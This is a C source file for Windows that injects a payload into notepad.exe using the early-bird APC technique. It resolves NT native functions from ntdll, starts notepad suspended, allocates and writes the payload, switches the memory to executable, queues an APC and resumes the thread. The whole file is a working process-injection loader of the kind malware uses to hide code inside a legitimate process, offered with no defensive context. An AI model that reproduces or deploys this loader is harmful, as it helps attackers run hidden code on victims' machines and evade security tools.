#include "Defs.h"

int main(){
NtOpenProcess open = (NtOpenProcess) GetProcAddress(GetModuleHandleW(L"ntdll.dll"),"NtOpenProcess");
NtAllocateVirtualMemory AllocateMem = (NtAllocateVirtualMemory) GetProcAddress(GetModuleHandleW(L"ntdll.dll"),"NtAllocateVirtualMemory");
NtWriteVirtualMemory WriteMem = (NtWriteVirtualMemory) GetProcAddress(GetModuleHandleW(L"ntdll.dll"),"NtWriteVirtualMemory");
NtProtectVirtualMemory VirtProtect = (NtProtectVirtualMemory)GetProcAddress(GetModuleHandleW(L"ntdll.dll"),"NtProtectVirtualMemory");

 PVOID paylaodAddr = NULL;
 SIZE_T bytesWritten = 0;
 ULONG oldProtection;
 STARTUPINFO si;
 PROCESS_INFORMATION pi;
 ZeroMemory(&si,sizeof(si));
 ZeroMemory(&pi,sizeof(pi));
 si.cb = sizeof(si);

 if(CreateProcessA("C:\\Windows\\system32\\notepad.exe",NULL,NULL,NULL,FALSE,CREATE_SUSPENDED,NULL,NULL,&si,&pi)==0){
        _ERROR("Didnt create process .... 0%x",GetLastError());
        return 0;
    }

NTSTATUS result = AllocateMem(pi.hProcess,&paylaodAddr,0,&payloadSize,MEM_COMMIT,PAGE_READWRITE);
if (result !=0){
    _ERROR("Error While allocating memory , 0x%x\n",result); return 0;
}
HEADER2("ReadWrite Region allocated at 0x%x",paylaodAddr);

result = WriteMem(pi.hProcess,paylaodAddr,payload,payloadSize,&bytesWritten);
if (result != 0){
    _ERROR("Error While Writing into memory , 0x%x\n\n",result); return 0;

   }
 HEADER2("paylaod written , %d Bytes",bytesWritten);

result = VirtProtect(pi.hProcess,&paylaodAddr,&payloadSize,PAGE_EXECUTE_READ,&oldProtection);
if(result != 0){
    _ERROR("Coudlnt change region protection to execute_read ... 0x%x",result);
}
HEADER2("Memory changed to read_execute");

QueueUserAPC((PAPCFUNC)paylaodAddr,pi.hThread,0);
ResumeThread(pi.hThread);
}
